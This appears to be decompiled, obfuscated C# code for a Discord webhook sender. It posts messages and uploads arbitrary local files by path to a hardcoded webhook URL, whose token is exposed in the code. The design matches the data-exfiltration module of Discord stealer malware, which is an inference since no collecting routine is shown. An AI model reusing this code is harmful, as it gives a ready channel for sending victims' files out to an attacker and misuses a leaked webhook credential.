using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;

public class GClass0
{
	public static class GClass1
	{
		public class GClass2
		{
			[CompilerGenerated]
			private byte[] byte_0;

			[CompilerGenerated]
			private string string_0;

			[CompilerGenerated]
			private string string_1;

			public byte[] Byte_0
			{
				[CompilerGenerated]
				get
				{
					return byte_0;
				}
				[CompilerGenerated]
				set
				{
					byte_0 = value;
				}
			}

			public string String_0
			{
				[CompilerGenerated]
				get
				{
					return string_0;
				}
				[CompilerGenerated]
				set
				{
					string_0 = value;
				}
			}

			public string String_1
			{
				[CompilerGenerated]
				get
				{
					return string_1;
				}
				[CompilerGenerated]
				set
				{
					string_1 = value;
				}
			}

			public GClass2(byte[] file)
				: this(file, null)
			{
			}

			public GClass2(byte[] file, string filename)
				: this(file, filename, null)
			{
			}

			public GClass2(byte[] file, string filename, string contenttype)
			{
				Byte_0 = file;
				String_0 = filename;
				String_1 = contenttype;
			}
		}

		private static readonly Encoding encoding_0 = Encoding.UTF8;

		public static HttpWebResponse smethod_0(string string_0, string string_1, Dictionary<string, object> dictionary_0)
		{
			string text = $"----------{Guid.NewGuid():N}";
			string string_2 = "multipart/form-data; boundary=" + text;
			byte[] byte_ = smethod_2(dictionary_0, text);
			return smethod_1(string_0, string_1, string_2, byte_);
		}

		private static HttpWebResponse smethod_1(string string_0, string string_1, string string_2, byte[] byte_0)
		{
			if (!(WebRequest.Create(string_0) is HttpWebRequest httpWebRequest))
			{
				throw new NullReferenceException("request is not a http request");
			}
			httpWebRequest.Method = "POST";
			httpWebRequest.ContentType = string_2;
			httpWebRequest.UserAgent = string_1;
			httpWebRequest.CookieContainer = new CookieContainer();
			httpWebRequest.ContentLength = byte_0.Length;
			using (Stream stream = httpWebRequest.GetRequestStream())
			{
				stream.Write(byte_0, 0, byte_0.Length);
				stream.Close();
			}
			return httpWebRequest.GetResponse() as HttpWebResponse;
		}

		private static byte[] smethod_2(Dictionary<string, object> dictionary_0, string string_0)
		{
			Stream stream = new MemoryStream();
			bool flag = false;
			foreach (KeyValuePair<string, object> item in dictionary_0)
			{
				if (flag)
				{
					stream.Write(encoding_0.GetBytes("\r\n"), 0, encoding_0.GetByteCount("\r\n"));
				}
				flag = true;
				if (item.Value is GClass2)
				{
					GClass2 gClass = (GClass2)item.Value;
					string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"{1}\"; filename=\"{2}\"\r\nContent-Type: {3}\r\n\r\n", string_0, item.Key, gClass.String_0 ?? item.Key, gClass.String_1 ?? "application/octet-stream");
					stream.Write(encoding_0.GetBytes(s), 0, encoding_0.GetByteCount(s));
					stream.Write(gClass.Byte_0, 0, gClass.Byte_0.Length);
				}
				else
				{
					string s2 = $"--{string_0}\r\nContent-Disposition: form-data; name=\"{item.Key}\"\r\n\r\n{item.Value}";
					stream.Write(encoding_0.GetBytes(s2), 0, encoding_0.GetByteCount(s2));
				}
			}
			string s3 = "\r\n--" + string_0 + "--\r\n";
			stream.Write(encoding_0.GetBytes(s3), 0, encoding_0.GetByteCount(s3));
			stream.Position = 0L;
			byte[] array = new byte[stream.Length];
			stream.Read(array, 0, array.Length);
			stream.Close();
			return array;
		}
	}

	private static string string_0 = "https://discord.com/api/webhooks/839746341240307743/z9KSJvySsjPhte85U_acUGG0tppPFgXD8YPsf_Mab32iFceuzuAAwIxSrx3Hy3uxZ80k";

	private static string string_1 = "deffo";

	private static string string_2 = "deffo";

	private static string string_3 = "";

	public static void smethod_0()
	{
		smethod_1("Test message recieved successfully! :raised_hands:");
	}

	public static string smethod_1(string string_4)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add("username", string_2);
		dictionary.Add("content", string_4);
		dictionary.Add("avatar_url", string_3);
		HttpWebResponse httpWebResponse = GClass1.smethod_0(string_0, string_1, dictionary);
		string result = new StreamReader(httpWebResponse.GetResponseStream()).ReadToEnd();
		httpWebResponse.Close();
		return result;
	}

	public static string smethod_2(string string_4, string string_5)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add("username", string_5);
		dictionary.Add("content", string_4);
		dictionary.Add("avatar_url", string_3);
		HttpWebResponse httpWebResponse = GClass1.smethod_0(string_0, string_1, dictionary);
		string result = new StreamReader(httpWebResponse.GetResponseStream()).ReadToEnd();
		httpWebResponse.Close();
		return result;
	}

	public static string smethod_3(string string_4, string string_5, string string_6)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add("username", string_5);
		dictionary.Add("content", string_4);
		dictionary.Add("avatar_url", string_3);
		HttpWebResponse httpWebResponse = GClass1.smethod_0(string_6, string_1, dictionary);
		string result = new StreamReader(httpWebResponse.GetResponseStream()).ReadToEnd();
		httpWebResponse.Close();
		return result;
	}

	public static string smethod_4(string string_4, string string_5, string string_6, string string_7, string string_8)
	{
		FileStream fileStream = new FileStream(string_7, FileMode.Open, FileAccess.Read);
		byte[] array = new byte[fileStream.Length];
		fileStream.Read(array, 0, array.Length);
		fileStream.Close();
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add("filename", string_5);
		dictionary.Add("fileformat", string_6);
		dictionary.Add("file", new GClass1.GClass2(array, string_5, string_8));
		dictionary.Add("username", string_2);
		dictionary.Add("content", string_4);
		HttpWebResponse httpWebResponse = GClass1.smethod_0(string_0, string_1, dictionary);
		string result = new StreamReader(httpWebResponse.GetResponseStream()).ReadToEnd();
		httpWebResponse.Close();
		return result;
	}

	public static string smethod_5(string string_4, string string_5, string string_6, string string_7, string string_8, string string_9)
	{
		FileStream fileStream = new FileStream(string_7, FileMode.Open, FileAccess.Read);
		byte[] array = new byte[fileStream.Length];
		fileStream.Read(array, 0, array.Length);
		fileStream.Close();
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add("filename", string_5);
		dictionary.Add("fileformat", string_6);
		dictionary.Add("file", new GClass1.GClass2(array, string_5, string_8));
		dictionary.Add("username", string_9);
		dictionary.Add("content", string_4);
		HttpWebResponse httpWebResponse = GClass1.smethod_0(string_0, string_1, dictionary);
		string result = new StreamReader(httpWebResponse.GetResponseStream()).ReadToEnd();
		httpWebResponse.Close();
		return result;
	}

	public static string smethod_6(string string_4, string string_5, string string_6, string string_7, string string_8, string string_9, string string_10)
	{
		FileStream fileStream = new FileStream(string_7, FileMode.Open, FileAccess.Read);
		byte[] array = new byte[fileStream.Length];
		fileStream.Read(array, 0, array.Length);
		fileStream.Close();
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add("filename", string_5);
		dictionary.Add("fileformat", string_6);
		dictionary.Add("file", new GClass1.GClass2(array, string_5, string_8));
		dictionary.Add("username", string_9);
		dictionary.Add("content", string_4);
		HttpWebResponse httpWebResponse = GClass1.smethod_0(string_10, string_1, dictionary);
		string result = new StreamReader(httpWebResponse.GetResponseStream()).ReadToEnd();
		httpWebResponse.Close();
		return result;
	}
}
